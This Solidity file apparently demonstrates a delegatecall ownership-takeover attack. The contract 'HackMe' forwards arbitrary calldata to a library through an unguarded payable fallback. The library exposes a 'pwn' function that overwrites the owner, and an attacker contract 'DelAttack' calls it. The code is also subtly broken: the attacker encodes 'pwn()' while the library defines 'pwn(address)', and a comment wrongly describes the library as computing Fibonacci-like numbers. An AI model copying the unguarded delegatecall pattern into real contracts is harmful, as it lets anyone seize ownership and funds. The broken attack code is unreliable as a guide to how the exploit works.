pragma solidity ^0.8.4;
// library contract - calculates fibonacci-like numbers;
import "hardhat/console.sol";
contract Lib {
    address public owner;
    
    function getOwner() public view returns(address) {
        return owner;
    }

    constructor() {
        owner = msg.sender;
    }

    function pwn(address _Owner) public {
        console.log("here");
        owner = _Owner;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        console.log("here");
        address(lib).delegatecall(msg.data);
    }
}

contract DelAttack {
    address public hackMe;
    address public newOwner;
    constructor(address _hackMe, address _newOwner) {
        hackMe = _hackMe;
        newOwner = _newOwner;
    }

    function attack() public {
         console.log("here");
         (bool sent, ) = hackMe.call{value:1 ether}(abi.encodeWithSignature("pwn()"));
         console.log(sent);
    }
}